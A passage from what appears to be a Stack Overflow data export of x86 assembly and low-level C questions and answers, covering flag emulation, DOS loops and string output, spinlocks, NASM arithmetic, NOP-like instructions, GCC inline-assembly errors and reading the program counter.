  // Calculate the overflow using the carry-out and
  // most significant carry-in.
  carryIns = (carryIns &gt;&gt; 7) ^ carryOut;
#endif

  // Update flags.
  *flags &amp;= ~(FLAGS_CY_MASK | FLAGS_OV_MASK);
  *flags |= (carryOut &lt;&lt; FLAGS_CY_SHIFT) | (carryIns &lt;&lt; FLAGS_OV_SHIFT);
}

void Sbb(uint8* acc, uint8 b, uint8* flags)
{
  // a - b - c = a + ~b + 1 - c = a + ~b + !c
  *flags ^= FLAGS_CY_MASK;
  Adc(acc, ~b, flags);
  *flags ^= FLAGS_CY_MASK;
}

const uint8 testData[] =
{
  0,
  1,
  0x7F,
  0x80,
  0x81,
  0xFF
};

int main(void)
{
  unsigned aidx, bidx, c;

  printf(""ADC:\n"");
  for (c = 0; c &lt;= 1; c++)
    for (aidx = 0; aidx &lt; sizeof(testData)/sizeof(testData[0]); aidx++)
      for (bidx = 0; bidx &lt; sizeof(testData)/sizeof(testData[0]); bidx++)
      {
        uint8 a = testData[aidx];
        uint8 b = testData[bidx];
        uint8 flags = c &lt;&lt; FLAGS_CY_SHIFT;
        printf(""%3d(%4d) + %3d(%4d) + %u = "",
               a, (int8)a, b, (int8)b, c);
        Adc(&amp;a, b, &amp;flags);
        printf(""%3d(%4d) CY=%d OV=%d\n"",
               a, (int8)a, (flags &amp; FLAGS_CY_MASK) != 0, (flags &amp; FLAGS_OV_MASK) != 0);
      }

  printf(""SBB:\n"");
  for (c = 0; c &lt;= 1; c++)
    for (aidx = 0; aidx &lt; sizeof(testData)/sizeof(testData[0]); aidx++)
      for (bidx = 0; bidx &lt; sizeof(testData)/sizeof(testData[0]); bidx++)
      {
        uint8 a = testData[aidx];
        uint8 b = testData[bidx];
        uint8 flags = c &lt;&lt; FLAGS_CY_SHIFT;
        printf(""%3d(%4d) - %3d(%4d) - %u = "",
               a, (int8)a, b, (int8)b, c);
        Sbb(&amp;a, b, &amp;flags);
        printf(""%3d(%4d) CY=%d OV=%d\n"",
               a, (int8)a, (flags &amp; FLAGS_CY_MASK) != 0, (flags &amp; FLAGS_OV_MASK) != 0);
      }

  return 0;
}
</code></pre>

<p>Output:</p>

<pre><code>ADC:
  0(   0) +   0(   0) + 0 =   0(   0) CY=0 OV=0
  0(   0) +   1(   1) + 0 =   1(   1) CY=0 OV=0
  0(   0) + 127( 127) + 0 = 127( 127) CY=0 OV=0
  0(   0) + 128(-128) + 0 = 128(-128) CY=0 OV=0
  0(   0) + 129(-127) + 0 = 129(-127) CY=0 OV=0
  0(   0) + 255(  -1) + 0 = 255(  -1) CY=0 OV=0
  1(   1) +   0(   0) + 0 =   1(   1) CY=0 OV=0
  1(   1) +   1(   1) + 0 =   2(   2) CY=0 OV=0
  1(   1) + 127( 127) + 0 = 128(-128) CY=0 OV=1
  1(   1) + 128(-128) + 0 = 129(-127) CY=0 OV=0
  1(   1) + 129(-127) + 0 = 130(-126) CY=0 OV=0
  1(   1) + 255(  -1) + 0 =   0(   0) CY=1 OV=0
127( 127) +   0(   0) + 0 = 127( 127) CY=0 OV=0
127( 127) +   1(   1) + 0 = 128(-128) CY=0 OV=1
127( 127) + 127( 127) + 0 = 254(  -2) CY=0 OV=1
127( 127) + 128(-128) + 0 = 255(  -1) CY=0 OV=0
127( 127) + 129(-127) + 0 =   0(   0) CY=1 OV=0
127( 127) + 255(  -1) + 0 = 126( 126) CY=1 OV=0
128(-128) +   0(   0) + 0 = 128(-128) CY=0 OV=0
128(-128) +   1(   1) + 0 = 129(-127) CY=0 OV=0
128(-128) + 127( 127) + 0 = 255(  -1) CY=0 OV=0
128(-128) + 128(-128) + 0 =   0(   0) CY=1 OV=1
128(-128) + 129(-127) + 0 =   1(   1) CY=1 OV=1
128(-128) + 255(  -1) + 0 = 127( 127) CY=1 OV=1
129(-127) +   0(   0) + 0 = 129(-127) CY=0 OV=0
129(-127) +   1(   1) + 0 = 130(-126) CY=0 OV=0
129(-127) + 127( 127) + 0 =   0(   0) CY=1 OV=0
129(-127) + 128(-128) + 0 =   1(   1) CY=1 OV=1
129(-127) + 129(-127) + 0 =   2(   2) CY=1 OV=1
129(-127) + 255(  -1) + 0 = 128(-128) CY=1 OV=0
255(  -1) +   0(   0) + 0 = 255(  -1) CY=0 OV=0
255(  -1) +   1(   1) + 0 =   0(   0) CY=1 OV=0
255(  -1) + 127( 127) + 0 = 126( 126) CY=1 OV=0
255(  -1) + 128(-128) + 0 = 127( 127) CY=1 OV=1
255(  -1) + 129(-127) + 0 = 128(-128) CY=1 OV=0
255(  -1) + 255(  -1) + 0 = 254(  -2) CY=1 OV=0
  0(   0) +   0(   0) + 1 =   1(   1) CY=0 OV=0
  0(   0) +   1(   1) + 1 =   2(   2) CY=0 OV=0
  0(   0) + 127( 127) + 1 = 128(-128) CY=0 OV=1
  0(   0) + 128(-128) + 1 = 129(-127) CY=0 OV=0
  0(   0) + 129(-127) + 1 = 130(-126) CY=0 OV=0
  0(   0) + 255(  -1) + 1 =   0(   0) CY=1 OV=0
  1(   1) +   0(   0) + 1 =   2(   2) CY=0 OV=0
  1(   1) +   1(   1) + 1 =   3(   3) CY=0 OV=0
  1(   1) + 127( 127) + 1 = 129(-127) CY=0 OV=1
  1(   1) + 128(-128) + 1 = 130(-126) CY=0 OV=0
  1(   1) + 129(-127) + 1 = 131(-125) CY=0 OV=0
  1(   1) + 255(  -1) + 1 =   1(   1) CY=1 OV=0
127( 127) +   0(   0) + 1 = 128(-128) CY=0 OV=1
127( 127) +   1(   1) + 1 = 129(-127) CY=0 OV=1
127( 127) + 127( 127) + 1 = 255(  -1) CY=0 OV=1
127( 127) + 128(-128) + 1 =   0(   0) CY=1 OV=0
127( 127) + 129(-127) + 1 =   1(   1) CY=1 OV=0
127( 127) + 255(  -1) + 1 = 127( 127) CY=1 OV=0
128(-128) +   0(   0) + 1 = 129(-127) CY=0 OV=0
128(-128) +   1(   1) + 1 = 130(-126) CY=0 OV=0
128(-128) + 127( 127) + 1 =   0(   0) CY=1 OV=0
128(-128) + 128(-128) + 1 =   1(   1) CY=1 OV=1
128(-128) + 129(-127) + 1 =   2(   2) CY=1 OV=1
128(-128) + 255(  -1) + 1 = 128(-128) CY=1 OV=0
129(-127) +   0(   0) + 1 = 130(-126) CY=0 OV=0
129(-127) +   1(   1) + 1 = 131(-125) CY=0 OV=0
129(-127) + 127( 127) + 1 =   1(   1) CY=1 OV=0
129(-127) + 128(-128) + 1 =   2(   2) CY=1 OV=1
129(-127) + 129(-127) + 1 =   3(   3) CY=1 OV=1
129(-127) + 255(  -1) + 1 = 129(-127) CY=1 OV=0
255(  -1) +   0(   0) + 1 =   0(   0) CY=1 OV=0
255(  -1) +   1(   1) + 1 =   1(   1) CY=1 OV=0
255(  -1) + 127( 127) + 1 = 127( 127) CY=1 OV=0
255(  -1) + 128(-128) + 1 = 128(-128) CY=1 OV=0
255(  -1) + 129(-127) + 1 = 129(-127) CY=1 OV=0
255(  -1) + 255(  -1) + 1 = 255(  -1) CY=1 OV=0
SBB:
  0(   0) -   0(   0) - 0 =   0(   0) CY=0 OV=0
  0(   0) -   1(   1) - 0 = 255(  -1) CY=1 OV=0
  0(   0) - 127( 127) - 0 = 129(-127) CY=1 OV=0
  0(   0) - 128(-128) - 0 = 128(-128) CY=1 OV=1
  0(   0) - 129(-127) - 0 = 127( 127) CY=1 OV=0
  0(   0) - 255(  -1) - 0 =   1(   1) CY=1 OV=0
  1(   1) -   0(   0) - 0 =   1(   1) CY=0 OV=0
  1(   1) -   1(   1) - 0 =   0(   0) CY=0 OV=0
  1(   1) - 127( 127) - 0 = 130(-126) CY=1 OV=0
  1(   1) - 128(-128) - 0 = 129(-127) CY=1 OV=1
  1(   1) - 129(-127) - 0 = 128(-128) CY=1 OV=1
  1(   1) - 255(  -1) - 0 =   2(   2) CY=1 OV=0
127( 127) -   0(   0) - 0 = 127( 127) CY=0 OV=0
127( 127) -   1(   1) - 0 = 126( 126) CY=0 OV=0
127( 127) - 127( 127) - 0 =   0(   0) CY=0 OV=0
127( 127) - 128(-128) - 0 = 255(  -1) CY=1 OV=1
127( 127) - 129(-127) - 0 = 254(  -2) CY=1 OV=1
127( 127) - 255(  -1) - 0 = 128(-128) CY=1 OV=1
128(-128) -   0(   0) - 0 = 128(-128) CY=0 OV=0
128(-128) -   1(   1) - 0 = 127( 127) CY=0 OV=1
128(-128) - 127( 127) - 0 =   1(   1) CY=0 OV=1
128(-128) - 128(-128) - 0 =   0(   0) CY=0 OV=0
128(-128) - 129(-127) - 0 = 255(  -1) CY=1 OV=0
128(-128) - 255(  -1) - 0 = 129(-127) CY=1 OV=0
129(-127) -   0(   0) - 0 = 129(-127) CY=0 OV=0
129(-127) -   1(   1) - 0 = 128(-128) CY=0 OV=0
129(-127) - 127( 127) - 0 =   2(   2) CY=0 OV=1
129(-127) - 128(-128) - 0 =   1(   1) CY=0 OV=0
129(-127) - 129(-127) - 0 =   0(   0) CY=0 OV=0
129(-127) - 255(  -1) - 0 = 130(-126) CY=1 OV=0
255(  -1) -   0(   0) - 0 = 255(  -1) CY=0 OV=0
255(  -1) -   1(   1) - 0 = 254(  -2) CY=0 OV=0
255(  -1) - 127( 127) - 0 = 128(-128) CY=0 OV=0
255(  -1) - 128(-128) - 0 = 127( 127) CY=0 OV=0
255(  -1) - 129(-127) - 0 = 126( 126) CY=0 OV=0
255(  -1) - 255(  -1) - 0 =   0(   0) CY=0 OV=0
  0(   0) -   0(   0) - 1 = 255(  -1) CY=1 OV=0
  0(   0) -   1(   1) - 1 = 254(  -2) CY=1 OV=0
  0(   0) - 127( 127) - 1 = 128(-128) CY=1 OV=0
  0(   0) - 128(-128) - 1 = 127( 127) CY=1 OV=0
  0(   0) - 129(-127) - 1 = 126( 126) CY=1 OV=0
  0(   0) - 255(  -1) - 1 =   0(   0) CY=1 OV=0
  1(   1) -   0(   0) - 1 =   0(   0) CY=0 OV=0
  1(   1) -   1(   1) - 1 = 255(  -1) CY=1 OV=0
  1(   1) - 127( 127) - 1 = 129(-127) CY=1 OV=0
  1(   1) - 128(-128) - 1 = 128(-128) CY=1 OV=1
  1(   1) - 129(-127) - 1 = 127( 127) CY=1 OV=0
  1(   1) - 255(  -1) - 1 =   1(   1) CY=1 OV=0
127( 127) -   0(   0) - 1 = 126( 126) CY=0 OV=0
127( 127) -   1(   1) - 1 = 125( 125) CY=0 OV=0
127( 127) - 127( 127) - 1 = 255(  -1) CY=1 OV=0
127( 127) - 128(-128) - 1 = 254(  -2) CY=1 OV=1
127( 127) - 129(-127) - 1 = 253(  -3) CY=1 OV=1
127( 127) - 255(  -1) - 1 = 127( 127) CY=1 OV=0
128(-128) -   0(   0) - 1 = 127( 127) CY=0 OV=1
128(-128) -   1(   1) - 1 = 126( 126) CY=0 OV=1
128(-128) - 127( 127) - 1 =   0(   0) CY=0 OV=1
128(-128) - 128(-128) - 1 = 255(  -1) CY=1 OV=0
128(-128) - 129(-127) - 1 = 254(  -2) CY=1 OV=0
128(-128) - 255(  -1) - 1 = 128(-128) CY=1 OV=0
129(-127) -   0(   0) - 1 = 128(-128) CY=0 OV=0
129(-127) -   1(   1) - 1 = 127( 127) CY=0 OV=1
129(-127) - 127( 127) - 1 =   1(   1) CY=0 OV=1
129(-127) - 128(-128) - 1 =   0(   0) CY=0 OV=0
129(-127) - 129(-127) - 1 = 255(  -1) CY=1 OV=0
129(-127) - 255(  -1) - 1 = 129(-127) CY=1 OV=0
255(  -1) -   0(   0) - 1 = 254(  -2) CY=0 OV=0
255(  -1) -   1(   1) - 1 = 253(  -3) CY=0 OV=0
255(  -1) - 127( 127) - 1 = 127( 127) CY=0 OV=1
255(  -1) - 128(-128) - 1 = 126( 126) CY=0 OV=0
255(  -1) - 129(-127) - 1 = 125( 125) CY=0 OV=0
255(  -1) - 255(  -1) - 1 = 255(  -1) CY=1 OV=0
</code></pre>

<p>You can change <code>#if 0</code> to <code>#if 1</code> to use the sign-comparison-based method for overflow calculation. The result will be the same. At first glance it's a bit surprising that the sign-based method takes care of the carry-in too.</p>

<p>Please note that by using my method in which I calculate all carry-ins into bits 0 through 7, you also get for free the value of the <code>half-carry</code> flag (carry from bit 3 to bit 4) that's needed for the <code>DAA</code> instruction.</p>

<p><strong>EDIT:</strong> I've added a function for subtraction with borrow (SBC/SBB instruction) and results for it.</p>
","8037485"
"Two loops nested inside another loop in x86 assembly","8563","","<p>I've got a problem looping in assembly language.</p>

<p>When we want to use the counter register for looping in nested loop,
what we first do is move the value of counter register into the stack for outer loop and then fetch it back when we're done with the inner loop, this way we're capable of using one counter register for looping into the nested loop with different number of iteration on each loop.</p>

<p>But what about nested loop inside a nested loop?</p>

<p>I want to print a pyramid made of of the character <code>S</code>. What I am getting is,</p>

<pre><code>SSSSSSSSSS
SSSSSSSSS
SSSSSSSS
SSSSSSS
SSSSSS
SSSSS
SSSS
SSS
SS
S
</code></pre>

<p>What I actually want is,</p>

<pre><code> SSSSSSSSSS
  SSSSSSSS
   SSSSSS
    SSSS
     SS
     S
</code></pre>

<p>Here is my code for the program</p>

<pre><code>MOV BX,10           ; HOLD 10 IN BX FOR INNER LOOP
     MOV AX,0           ; START ITERATIONS FROM 0
     MOV CX,10          ; MAX NUMBER OF ITERATIONS

    L2:

        PUSH CX         ;PUSH CX IN A STACK
        MOV CX,BX       ;STORE NEW VALUE IN CX FOR INNER LOOP ITERATION

            L1:

                MOV DX, [SI]               ; MOVE THE STRING INTO DX
                MOV AH,02H                 ; DISPLAY EVERYTHING FROM DX
                INT 21H

            LOOP L1

        MOV DX,0AH     ;PRINT LINE FEED AFTER PRINTING EACH LINE OF ASTERIKS
        MOV AH,02H
        INT 21H

        SUB BX,01     ;DECREASE THE VALUE OF BX BY 1

        POP CX        ;RESTORE ORIGINAL VALUE OF CX FOR OUTER LOOP
        ADD AX,01     ;INCREMENT VALUE OF AX BY 1

    LOOP L2


     MOV AH, 4CH                  ;RETURN CONTROL TO DOS
     INT 21H
</code></pre>

<p>In order to achieve what I want, i need to add another loop inside the nested loop that prints space characters (i.e 020H). But for this I need another counter register and I am not able to do it. How can I solve this problem?</p>
","<p>About like that?</p>

<pre><code>L2:

    PUSH CX         ;PUSH CX IN A STACK

    ; insert this
    MOV CX, 10      ; width of your tree = 10
    SUB CX, BX      ; subtract length of ""s"" string
    SHR CX, 1       ; divide CX by 2 =&gt; number of spaces at the beginning
    JCXZ endL3      ; no spaces? don't do anything

       L3:
            MOV DX, 20H ; space character
            MOV AH,02H                 ; print space
            INT 21H

        LOOP L3

    endL3:

    MOV CX,BX       ;STORE NEW VALUE IN CX FOR INNER LOOP ITERATION

        L1:

            MOV DX, [SI]               ; MOVE THE STRING INTO DX
            MOV AH,02H                 ; DISPLAY EVERYTHING FROM DX
            INT 21H

        LOOP L1

    MOV DX,0AH     ;PRINT LINE FEED AFTER PRINTING EACH LINE OF ASTERIKS
    MOV AH,02H
    INT 21H

    SUB BX,01     ;DECREASE THE VALUE OF BX BY 1

    POP CX        ;RESTORE ORIGINAL VALUE OF CX FOR OUTER LOOP
    ADD AX,01     ;INCREMENT VALUE OF AX BY 1

LOOP L2
</code></pre>

<p>Btw, for what purpose are you initializing and incrementing AX? You overwrite it anyway when moving data to AH/AL.</p>
","12329059"
"Assembly language","8541","","<p>I am very much a rookie.  I am sure this is very basic but I have gone over this a number of times.  I am trying to get my program to display a string on two different lines.  This is a .com program and I am using A86 compiler.  This is for HW and i am not trying to cheat or anything like that because I really want to know what I am doing wrong.</p>

<pre><code>jmp start               ; This will start the program

;============================

  msg   db  ""Hello Word.$""      ; A string variable 
  msg   db  ""Michael J. Crawley$""   ; A string variable with a value.

;============================

start:

  mov ah,09             ; subfunction 9 output a string

  mov dx,offset msg         ; DX for the string

  int 21h               ; Output the message

  int 21h               ; Output the message

exit:

  mov ah,4ch
  mov al,00             ; Exit code 

  int 21h               ; End program
</code></pre>
","<p>Here are your specific problems:</p>

<ul>
<li>You define <code>msg</code> twice (a86 will barf on that).</li>
<li>You call int21 fn9 with the <em>same</em> value of msg so you're not printing the two messages out, just two copies of the first.</li>
<li>You don't have a newline character in either message so they'll abut each other rather than be on separate lines.</li>
</ul>

<p>The solutions to those points (without providing the actual code).</p>

<ul>
<li>Label the second message as <code>msg2</code>.</li>
<li>Load <code>msg2</code> into dx before calling int21 for the second time.</li>
<li>Change the messages to put a newline before the '$' symbol (or at least the first one).</li>
</ul>

<hr>

<p><em>Update:</em> Since some other helpful soul has already provided source, here's my solution. I would suggest you <em>learn</em> from this and modify your own code to do a similar thing. If you copy it verbatim from a public site for classwork, you'll almost certainly be caught out for plagiarism:</p>

<pre><code>         jmp start                   ; This will start the program

msg      db  ""Hello Word."",0a,""$""    ; A string variable .
msg2     db  ""Michael J. Crawley$""   ; A string variable with a value.

start:   mov ah,09                   ; subfunction 9 output a string
         mov dx,offset msg           ; DX for the string
         int 21h                     ; Output the message
         mov dx,offset msg2          ; DX for the string
         int 21h                     ; Output the message
exit:
         mov ah,4ch
         mov al,00                   ; Exit code 
         int 21h                     ; End program
</code></pre>

<p>This outputs:</p>

<pre><code>Hello Word.
Michael J. Crawley
</code></pre>
","2249673"
"Fastest inline-assembly spinlock","8540","","<p>I'm writing a multithreaded application in c++, where performance is critical. I need to use a lot of locking while copying small structures between threads, for this I have chosen to use spinlocks.</p>

<p>I have done some research and speed testing on this and I found that most implementations are roughly equally fast:</p>

<ul>
<li>Microsofts CRITICAL_SECTION, with SpinCount set to 1000, scores about 140 time units</li>
<li>Implementing <a href=""http://www.modula2.org/sb/env/index34.htm"" rel=""nofollow noreferrer"">this algorithm</a> with Microsofts InterlockedCompareExchange scores about 95 time units</li>
<li>Ive also tried to use some inline assembly with <code>__asm {}</code> using something like <a href=""https://stackoverflow.com/questions/11923151/is-there-any-simple-way-to-improve-performance-of-this-spinlock-function"">this code</a> and it scores about 70 time units, <strong>but I am not sure that a proper memory barrier has been created.</strong></li>
</ul>

<p>Edit: The times given here are the time it takes for 2 threads to lock and unlock the spinlock 1,000,000 times.</p>

<p>I know this isn't a lot of difference but as a spinlock is a heavily used object, one would think that programmers would have agreed on the fastest possible way to make a spinlock. Googling it leads to many different approaches however. I would think <a href=""http://www.modula2.org/sb/env/index34.htm"" rel=""nofollow noreferrer"">this aforementioned method</a> would be the fastest if implemented using inline assembly and using the instruction <code>CMPXCHG8B</code> instead of comparing 32bit registers. <strong>Furthermore memory barriers must be taken into account, this could be done by LOCK CMPXHG8B (I think?)</strong>, which guarantees ""exclusive rights"" to the shared memory between cores. At last [some suggests] that for <strong>busy waits should be accompanied by NOP:REP</strong> that would enable Hyper-threading processors to switch to another thread, but I am not sure whether this is true or not?</p>

<p>From my performance-test of different spinlocks, it is seen that there is not much difference, but for purely academic purpose I would like to know which one is fastest. However as I have extremely limited experience in the assembly-language and with memory barriers, I would be happy if someone could write the assembly code for the last example I provided with LOCK CMPXCHG8B and <strong>proper memory barriers</strong> in the following template:</p>

<pre><code>__asm
{
     spin_lock:
         ;locking code.
     spin_unlock:
         ;unlocking code.
}
</code></pre>
","<p>Just look here:
<a href=""https://stackoverflow.com/questions/6935442/x86-spinlock-using-cmpxchg"">x86 spinlock using cmpxchg</a></p>

<p>And thanks to Cory Nelson</p>

<pre><code>__asm{
spin_lock:
xorl %ecx, %ecx
incl %ecx
spin_lock_retry:
xorl %eax, %eax
lock; cmpxchgl %ecx, (lock_addr)
jnz spin_lock_retry
ret

spin_unlock:
movl $0 (lock_addr)
ret
}
</code></pre>

<p>And another source says:
<a href=""http://www.geoffchappell.com/studies/windows/km/cpu/cx8.htm"" rel=""nofollow noreferrer"">http://www.geoffchappell.com/studies/windows/km/cpu/cx8.htm</a></p>

<pre><code>       lock    cmpxchg8b qword ptr [esi]
is replaceable with the following sequence

try:
        lock    bts dword ptr [edi],0
        jnb     acquired
wait:
        test    dword ptr [edi],1
        je      try
        pause                   ; if available
        jmp     wait

acquired:
        cmp     eax,[esi]
        jne     fail
        cmp     edx,[esi+4]
        je      exchange

fail:
        mov     eax,[esi]
        mov     edx,[esi+4]
        jmp     done

exchange:
        mov     [esi],ebx
        mov     [esi+4],ecx

done:
        mov     byte ptr [edi],0
</code></pre>

<p>And here is a discussion about lock-free vs lock implementations:
<a href=""http://newsgroups.derkeiler.com/Archive/Comp/comp.programming.threads/2011-10/msg00009.html"" rel=""nofollow noreferrer"">http://newsgroups.derkeiler.com/Archive/Comp/comp.programming.threads/2011-10/msg00009.html</a></p>
","11959527"
"add two digit numbers in NASM(Linux)","8523","","<p>I want to add two-digit numbers in NASM(Linux). To add two simple numbers, I use the following code:</p>

<pre><code>section .text
    global _start    ;must be declared for using gcc
_start:    ;tell linker entry point
    mov     eax,'3'
    sub     eax, '0'
    mov     ebx, '4'
    sub     ebx, '0'
    add     eax, ebx
    add eax, '0'
    mov     [sum], eax
    mov ecx,msg 
    mov edx, len
    mov ebx,1   ;file descriptor (stdout)
    mov eax,4   ;system call number (sys_write)
    int 0x80    ;call kernel
    mov ecx,sum
    mov edx, 1
    mov ebx,1   ;file descriptor (stdout)
    mov eax,4   ;system call number (sys_write)
    int 0x80    ;call kernel
    mov eax,1   ;system call number (sys_exit)
    int 0x80    ;call kernel

section .data
    msg db ""The sum is:"", 0xA,0xD 
    len equ $ - msg   
    segment .bss
    sum resb 1
</code></pre>

<p><strong>The result of the code is 7.But when I carry number 17 in register eax forexample the result is not correct.In this case 5.Tell me please what is the problem? Thank you!</strong></p>
","<p>Here's your example with a little bit of cleaning up to help make it easier to read.</p>

<p>Suggestion: this kind of consistency will greatly improve your public image.</p>

<p>But hey; nice commenting, I could read your code and understand it (which is why I decided to answer you)</p>

<pre><code>section .text

global _start               ;must be declared for using gcc

_start:                     ;tell linker entry point

    mov     eax, '3'
    sub     eax, '0'
    mov     ebx, '4'
    sub     ebx, '0'
    add     eax, ebx
    add     eax, '0'

    mov     [sum], eax

    mov     ecx, msg 
    mov     edx, len
    mov     ebx, 1          ;file descriptor (stdout)
    mov     eax, 4          ;system call number (sys_write)
    int     0x80            ;call kernel

    mov     ecx, sum

    mov     edx, 1
    mov     ebx, 1          ;file descriptor (stdout)
    mov     eax, 4          ;system call number (sys_write)
    int     0x80            ;call kernel

    mov     eax, 1          ;system call number (sys_exit)
    int     0x80            ;call kernel


section .data

    msg     db              ""The sum is:"", 0xA,0xD 

    len equ $ - msg   

    segment .bss

    sum resb 1
</code></pre>

<p>Okay now, as for your comment, ""...<em>But when I carry number 17 in register eax forexample the result is not correct.</em>""</p>

<p>I can imagine !</p>

<p>Question, when you ""...<em>carry number 17 in register eax</em>..."" are you doing it like this ?...</p>

<pre><code>    Mov     Eax,""17""
</code></pre>

<p>If so, slow down and take a look at your code one step at a time via debug.</p>

<p>I believe that what you'll see is that you are actually doing this...</p>

<pre><code>    Mov     Eax, 3137h
</code></pre>

<p>Although it might be</p>

<pre><code>    Mov     Eax, 3731h
</code></pre>

<p>Interesting concept. I've never done anything like that. Whatever.</p>

<p>What's more, if you are using this place to store that same number...</p>

<pre><code>    sum resb 1
</code></pre>

<p>You only have one byte.</p>

<p>Best I can tell, your example code is limited to single digit numbers.</p>

<p>Now then, since your label <code>sum</code> has reserved only one byte; 8 bits, you can see the problem as you are storing 32 bits there. (Well, you're trying to; it won't work.) No clue what happens when you do that. You probably want to rethink that structure.</p>

<p>As for why 17 becomes 5, no clue here. </p>

<p>Let us know if any of this helps you. Assembly is great stuff. As you are personally experiencing, the initial thought adjustment can be strange for the brain, can't it !</p>
","26206803"
"What's the point of LEA EAX, [EAX]?","8523","","<pre><code>LEA EAX, [EAX]
</code></pre>

<p>I encountered this instruction in a binary compiled with the Microsoft C compiler. It clearly can't change the value of EAX. Then why is it there?</p>
","<p>It is a <code>NOP</code>.</p>

<p>The following are typcially used as <code>NOP</code>. They all do the same thing but they result in machine code of different length. Depending on the alignment requirement one of them is chosen:</p>

<pre><code>xchg eax, eax         = 90
mov eax, eax          = 89 C0 
lea eax, [eax + 0x00] = 8D 40 00 
</code></pre>
","2703440"
"GCC inline assembly error: Error: junk `(%esp)' after expression","8521","","<p>GCC inline assembly error: Error: junk `(%esp)' after expression</p>

<p>I'm studying gcc inline assembly. My environment is Win 7 32bit, mingw-gcc 4.6.1. </p>

<p>I have got a problem about the 'm' constraint. Here is my c function code:</p>

<pre><code>static int asm_test(int a, int b)
{

    int c = 0;
    __asm__ __volatile__("".intel_syntax\n""
            ""mov eax, %1\n"" //error
            ""mov edx, %2\n"" //error
            ""add eax, edx\n""
            ""mov %0, eax\n"" //error
            "".att_syntax""
            :""=m""(c)\
            :""m""(a),""m""(b)\
            :""eax"",""edx""
            );
    return c;
}
</code></pre>

<p>For at&amp;t code, it is like this:</p>

<pre><code>static int asm_test(int a, int b)
{

    int c = 0;
    __asm__ __volatile__(
            ""movl %1, $eax\n"" //error
            ""movl %2, $edx\n"" //error
            ""addl $edx, $eax\n""
            ""movl $eax, %0\n"" //error
            :""=m""(c)\
            :""m""(a),""m""(b)\
            :""eax"",""edx""
            );
    return c;
}
</code></pre>

<p>For each of the three lines which operate input/output operands, gcc generate an error when compiling, read like this:</p>

<p>C:\Users\farta\AppData\Local\Temp\cc99HxYj.s:22: <strong>Error: junk `(%esp)' after expression</strong></p>

<p>If i use 'r' for input/output constraint, the code will work. But I cannot understand why it works and what the error stands for. Can anyone tell me? As far as I know 'm' is just telling gcc not to allocate registers but directly access them in memory if inline asm code try to access input/output operands. Is this correct?</p>

<p>Thanks a lot.</p>
","<p>The problem here is the GCC generates AT&amp;T syntax construct for <code>%0</code>, <code>%1</code> and <code>%2</code>. If you look at the generated assembly, it looks like:</p>

<pre><code>.intel_syntax
mov eax, 8(%ebp)
mov edx, 12(%ebp)
add eax, edx
mov -4(%ebp), eax
</code></pre>

<p>which is not a valid Intel syntax.</p>

<p>Generally, you don't need to include in the inline assembly explicit load/store operation - just specify register constraint and the compiler will generate loads/stores by itself. This has the advantage that even if your variables (parameters, locals) do not reside in memory at all, but are in registers your code will still be correct - unlike in the case if you explicitly put memory load/stores there.</p>

<p>For your example, try the following code, look at the assembly (<code>gcc -S</code>) and notice how the compiler will perform moves from argument area (e.g. stack on x86) all by itself.</p>

<pre><code>int asm_test(int a, int b)
{
  __asm__ __volatile__ (
                        "".intel_syntax\n""
                        ""add %0, %1 \n""
                        "".att_syntax \n""
                        :""+r""(a)
                        :""r""(b));
  return a;
</code></pre>

<p>}</p>
","13858180"
"How to print exact value of the program counter in C","8506","","<p>I want to write a C program which would print the contents of the program counter <code>PC</code>. Can this be done from user space, or assembly, or some specific kernel routines are used?</p>
","<p>You should be able to determine the PC by using the <a href=""http://infocenter.arm.com/help/topic/com.arm.doc.dui0491c/CJAHICFI.html"" rel=""nofollow""><code>__current_pc()</code> intrinsic</a> in the ARM compiler toolchain (the ARM compiler supports many of the same extensions as GCC).<sup>*</sup> This is particular to ARM:</p>

<pre><code>int main () {
    printf(""%#x\n"", __current_pc());
    printf(""%#x\n"", __current_pc());
    printf(""%#x\n"", __current_pc());
    return 0;
}
</code></pre>

<blockquote>
  <p><sub>* Thanks to FrankH. for pointing out the presence of <code>__current_pc()</code></sub></p>
</blockquote>

<p>In general, the PC gets saved as the return address in a function call. On non-ARM <a href=""/questions/tagged/linux"" class=""post-tag"" title=""show questions tagged &#39;linux&#39;"" rel=""tag"">linux</a> systems with GCC, you can call <code>__builtin_return_address(0)</code> to obtain the return address of the current function call context. Obtaining the program counter in this way incurs the penalty of adding a function call, but it avoids inline assembly, so this technique is portable to any system supported by GCC.</p>

<pre><code>void * get_pc () { return __builtin_return_address(0); }
int main () {
    printf(""%p\n"", get_pc());
    printf(""%p\n"", get_pc());
    printf(""%p\n"", get_pc());
    return 0;
}
</code></pre>

<p>When I run the above program on my <code>x86</code> system, it produces the output:</p>

<pre><code>0x8048432
0x8048447
0x804845c
</code></pre>

<p>When disassembled in <code>gdb</code>:</p>

<pre><code>Dump of assembler code for function main:
   0x08048424 &lt;+0&gt;: push   %ebp
   0x08048425 &lt;+1&gt;: mov    %esp,%ebp
   0x08048427 &lt;+3&gt;: and    $0xfffffff0,%esp
   0x0804842a &lt;+6&gt;: sub    $0x10,%esp
   0x0804842d &lt;+9&gt;: call   0x804841c &lt;get_pc&gt;
   0x08048432 &lt;+14&gt;:    mov    %eax,0x4(%esp)
   0x08048436 &lt;+18&gt;:    movl   $0x8048510,(%esp)
   0x0804843d &lt;+25&gt;:    call   0x80482f0 &lt;printf@plt&gt;
   0x08048442 &lt;+30&gt;:    call   0x804841c &lt;get_pc&gt;
   0x08048447 &lt;+35&gt;:    mov    %eax,0x4(%esp)
   0x0804844b &lt;+39&gt;:    movl   $0x8048510,(%esp)
   0x08048452 &lt;+46&gt;:    call   0x80482f0 &lt;printf@plt&gt;
   0x08048457 &lt;+51&gt;:    call   0x804841c &lt;get_pc&gt;
   0x0804845c &lt;+56&gt;:    mov    %eax,0x4(%esp)
   0x08048460 &lt;+60&gt;:    movl   $0x8048510,(%esp)
   0x08048467 &lt;+67&gt;:    call   0x80482f0 &lt;printf@plt&gt;
   0x0804846c &lt;+72&gt;:    mov    $0x0,%eax
   0x08048471 &lt;+77&gt;:    leave  
   0x08048472 &lt;+78&gt;:    ret    
End of assembler dump.
</code></pre>
","18351147"
"more info on Memory layout of an executable program (process)","8488","","<p>I attended interview for samsung. They asked lot of questions on memory layout of the program.  I barely know anything about this.</p>

<p>I googled it ""Memory layout of an executable program"". ""Memory layout of process"".</p>

<p>I'm surprised to see that there isn't much info on these topics. Most of the results are forum queries. I just wonder why? </p>

<p>These are the few links I found:</p>

<ol>
<li><a href=""http://lambda.uta.edu/cse5317/notes/node33.html"" rel=""noreferrer"">Run-Time Storage Organization</a></li>
